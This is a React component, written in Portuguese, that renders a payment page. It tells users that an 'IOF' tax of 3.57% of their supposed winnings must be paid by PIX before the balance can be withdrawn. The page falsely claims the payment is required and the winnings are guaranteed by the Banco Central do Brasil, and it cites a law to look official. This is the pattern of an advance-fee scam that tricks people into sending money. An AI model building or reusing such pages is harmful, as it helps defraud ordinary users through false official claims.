interface IOFPageProps {
  balance: number;
  onPayTax: () => void;
}

export function IOFPage({ balance, onPayTax }: IOFPageProps) {
  const tax = Number((balance * 0.0357).toFixed(2));
  const total = balance - tax;

  return (
    <div className="min-h-screen bg-white flex flex-col p-6 max-w-2xl mx-auto">
      <div className="bg-[#FFF3CD] text-[#856404] p-4 rounded-lg mb-6 flex items-start gap-2">
        <span className="text-xl">⚠️</span>
        <div>
          <p className="font-bold">Imposto (IOF) obrigatório</p>
        </div>
      </div>

      <h1 className="text-2xl font-bold mb-2">Imposto sobre Operações Financeiras (IOF)</h1>
      
      <p className="text-gray-600 mb-6">
        O pagamento do Imposto sobre Operações Financeiras (IOF) é obrigatório e exigido pelo Banco Central do Brasil (Lei nº 8.894/94)
      </p>

      <p className="text-red-500 mb-6">
        * É necessário realizar o pagamento do IOF para receber o valor acumulado.
      </p>

      <div className="bg-white rounded-lg border p-4 mb-6">
        <h2 className="font-bold mb-4">Resumo</h2>
        <div className="space-y-3">
          <div className="flex justify-between">
            <span>Valor ganho</span>
            <span>R${balance.toFixed(2)}</span>
          </div>
          <div className="flex justify-between text-red-500">
            <span>Valor a ser pago (IOF)</span>
            <span>- R${tax}</span>
          </div>
          <div className="flex justify-between pt-3 border-t font-bold">
            <span>Total a receber</span>
            <span>R${total.toFixed(2)}</span>
          </div>
        </div>
      </div>

      <div className="bg-white rounded-lg border p-4 mb-6">
        <div className="flex items-start gap-2 mb-4">
          <span className="text-gray-500">ℹ️</span>
          <p className="text-gray-600">
            O pagamento de R${balance.toFixed(2)} será processado via PIX de forma imediata.
          </p>
        </div>
      </div>

      <div className="bg-white rounded-lg border p-4 mb-6">
        <div className="flex items-center gap-2 mb-2">
          <span className="text-green-500">✓</span>
          <h3 className="font-bold">Garantia de recebimento</h3>
        </div>
        <p className="text-gray-600">
          O valor ganho de R${balance.toFixed(2)} é garantido pelo Banco Central do Brasil
        </p>
      </div>

      <div className="bg-white rounded-lg border p-4 mb-8">
        <h3 className="font-bold mb-4">Método de pagamento</h3>
        <div className="flex items-center gap-2 mb-2">
          <img src="/pix.svg" alt="PIX" className="h-8" />
        </div>
        <p className="text-gray-600">
          Pague com PIX! Os pagamentos são simples, práticos e realizados em segundos.
        </p>
      </div>

      <button
        onClick={onPayTax}
        className="w-full bg-[#6C757D] text-white py-3 rounded-lg font-medium hover:bg-[#5a6268] transition-colors"
      >
        Pagar Imposto
      </button>

      <div className="mt-4 text-center text-sm text-gray-600">
        <input type="checkbox" id="terms" className="mr-2" />
        <label htmlFor="terms">
          Concordo com os termos, incluindo sobre o Imposto sobre Operações Financeiras (IOF), necessário para completar o saque em conformidade com as regulamentações vigentes.
        </label>
      </div>
    </div>
  );
}